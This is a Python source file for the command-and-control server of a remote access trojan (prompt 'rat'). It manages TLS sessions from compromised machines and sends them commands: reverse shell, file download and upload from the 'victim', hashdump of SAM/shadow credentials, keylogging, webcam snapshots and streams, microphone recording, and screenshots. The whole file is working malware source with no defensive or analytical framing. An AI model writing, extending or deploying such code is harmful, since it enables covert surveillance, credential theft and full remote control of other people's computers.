import socket
import ssl
import threading
from src.server.utils.config import logger
from utils.file_utils import FileUtils
from utils.socket_utils import readline

from src.utils.socket_utils import read_buffer


class TLSServer:
    def __init__(self, host: str, port: int, certfile: str, keyfile: str) -> None:
        self.host = host
        self.port = port
        self.context = self._create_context(certfile, keyfile)

        self.sock = None
        self.running = False

        self.sessions = {}
        self.addresses = {}
        self.next_id = 1
        self.current_session = None
        self.lock = threading.Lock()

    def _create_context(self, certfile, keyfile):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        return ctx

    def start(self):
        self.running = True

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.sock.settimeout(1.0)

        logger.debug("[+] TLS server listening on %s:%d", self.host, self.port)

        threading.Thread(target=self._accept_loop, daemon=True).start()

        try:
            self._console()
        except KeyboardInterrupt:
            logger.debug("[*] CTRL+C pressed")
        finally:
            self.stop()

    def _accept_loop(self):
        while self.running:
            try:
                client_sock, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            threading.Thread(
                target=self._handle_connection,
                args=(client_sock, addr),
                daemon=True
            ).start()

    def _handle_connection(self, client_sock, addr):
        try:
            tls_sock = self.context.wrap_socket(client_sock, server_side=True)
        except ssl.SSLError:
            logger.error("TLS handshake failed from %s", addr)
            return

        with self.lock:
            sid = self.next_id
            self.next_id += 1
            self.sessions[sid] = tls_sock
            self.addresses[sid] = addr
            if self.current_session is None:
                self.current_session = sid

        logger.debug("[+] New session %d from %s", sid, addr)
        self._listen_on_session(sid, tls_sock)

    def _listen_on_session(self, sid, tls_sock):
        try:
            while self.running:
                data = readline(tls_sock) # tls_sock.recv(4096)
                if not data:
                    break
                logger.debug("[session %d] %r", sid, data)
                self._handle_incoming_data(data)
        except Exception:
            logger.debug("[-] Session %d connection error", sid)
        finally:
            self._remove_session(sid)


    def _remove_session(self, sid):
        with self.lock:
            sock = self.sessions.pop(sid, None)
            self.addresses.pop(sid, None)
            if self.current_session == sid:
                self.current_session = next(iter(self.sessions), None)

        if sock:
            try:
                sock.close()
            except OSError:
                pass

        logger.debug("[-] Session %d closed", sid)

    def _console(self):
        logger.debug("Admin console ready (type 'help')")

        while self.running:
            prompt = "rat "
            if self.current_session:
                prompt += f"(session {self.current_session})"
            prompt += "> "

            cmd = input(prompt).strip()

            match cmd.split():
                case ["help"]:
                    self._help()

                case ["sessions"]:
                    self._sessions()

                case ["use", session_id]:
                    self._use(cmd)

                case ["upload", filename]:
                    self._send_file(filename)

                case ["download" | "search", filename]:
                    self._send_to_current(cmd.encode("utf-8"))

                case ["shell", port] if port.isdigit():
                    self._send_to_current(cmd.encode("utf-8"))

                case ["keylogger" | "webcam_stream" | "record_audio", duration] if duration.isdigit():
                    self._send_to_current(cmd.encode("utf-8"))

                case ["keylogger" | "webcam_stream" | "record_audio", _]:
                    logger.debug(f"Usage: {cmd.split()[0]} <duration_seconds>")

                case ["ipconfig" | "hashdump" | "screenshot" | "webcam_snapshot"]:
                    self._send_to_current(cmd.encode("utf-8"))

                case ["exit"]:
                    logger.debug("Exiting admin console")
                    return

                case _:
                    logger.debug("Invalid command or syntax")

    def _help(self):
        logger.debug("Commands:")
        logger.debug("  help                          -> show this help")
        logger.debug("  sessions                      -> list sessions")
        logger.debug("  use <id>                      -> switch session")
        logger.debug("  shell <listener_port>         -> reverse shell")
        logger.debug("  download <filepath>           -> download from victim")
        logger.debug("  upload <filepath>             -> upload to victim")
        logger.debug("  ipconfig                      -> network config")
        logger.debug("  screenshot                    -> take screenshot")
        logger.debug("  search <filename>             -> search file")
        logger.debug("  hashdump                      -> dump SAM/shadow")
        logger.debug("  keylogger <seconds>           -> record keystrokes")
        logger.debug("  webcam_snapshot               -> take webcam photo")
        logger.debug("  webcam_stream <seconds>       -> live webcam stream")
        logger.debug("  record_audio <seconds>        -> record microphone")
        logger.debug("  exit                          -> stop server")

    def _use(self, cmd: str):
        try:
            sid = int(cmd.split()[1])
            with self.lock:
                if sid in self.sessions:
                    self.current_session = sid
                    logger.debug("Switched to session %d", sid)
                else:
                    logger.debug("Invalid session id")
        except ValueError:
            logger.debug("Usage: use <id>")

    def _sessions(self):
        with self.lock:
            if not self.sessions:
                logger.debug("No active sessions")
            for sid in self.sessions:
                mark = "*" if sid == self.current_session else " "
                logger.debug("%s %d %s", mark, sid, self.addresses[sid])

    def _shell(self, cmd):
        try:
            int(cmd.split()[1])
            self._send_to_current(cmd.encode("utf-8"))
        except ValueError:
            logger.debug("Usage: shell <listener_port>")
            return

    def _recv_file(self, filename):
        with self.lock:
            sid = self.current_session
            sock = self.sessions.get(sid)

        try:
            FileUtils.download_file(sock, filename)
        except OSError:
            self._remove_session(sid)

    def _recv_output(self):
        with self.lock:
            sid = self.current_session
            sock = self.sessions.get(sid)

        try:
            logger.debug(read_buffer(sock).decode('utf-8'))
        except OSError:
            self._remove_session(sid)


    def _send_file(self, filename):
        import os

        if not os.path.exists(filename):
            logger.debug("File not found %s", filename)
            return

        with self.lock:
            sid = self.current_session
            sock = self.sessions.get(sid)

        try:
            FileUtils.send_file(sock, filename)
        except OSError:
            self._remove_session(sid)

    def _send_to_current(self, data):
        with self.lock:
            sid = self.current_session
            sock = self.sessions.get(sid)

        if not sock:
            logger.debug("No session selected")
            return
        try:
            sock.sendall(data + b"\n")
        except OSError:
            self._remove_session(sid)

    def _handle_incoming_data(self, operation):
        operation = operation.decode("utf-8")

        if operation.startswith('SEND_FILE '):
            filename = operation.split()[1]
            self._recv_file(filename)
        elif operation == "DISPLAY":
            logger.debug("[*] Server displaying")
            self._recv_output()
        elif operation == "FRAME":
            self._recv_frame()
        elif operation == "STREAM_END":
            logger.debug("[*] Webcam stream ended")
            
    def _recv_frame(self):
        """Reçoit et affiche une frame JPEG du stream webcam."""
        try:
            import cv2
            import numpy as np

            with self.lock:
                sid = self.current_session
                sock = self.sessions.get(sid)

            size_line = readline(sock).decode("ascii").strip()
            size = int(size_line)

            data = b""
            while len(data) < size:
                chunk = sock.recv(min(4096, size - len(data)))
                if not chunk:
                    break
                data += chunk

            frame = cv2.imdecode(
                np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR
            )
            if frame is not None:
                cv2.imshow("Webcam Stream", frame)
                cv2.waitKey(1)
        except Exception as e:
            logger.debug("[server] Frame recv error: %s", e)

    def stop(self):
        self.running = False

        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass

        with self.lock:
            sids = list(self.sessions.keys())

        for sid in sids:
            self._remove_session(sid)

        logger.debug("[*] Server stopped")
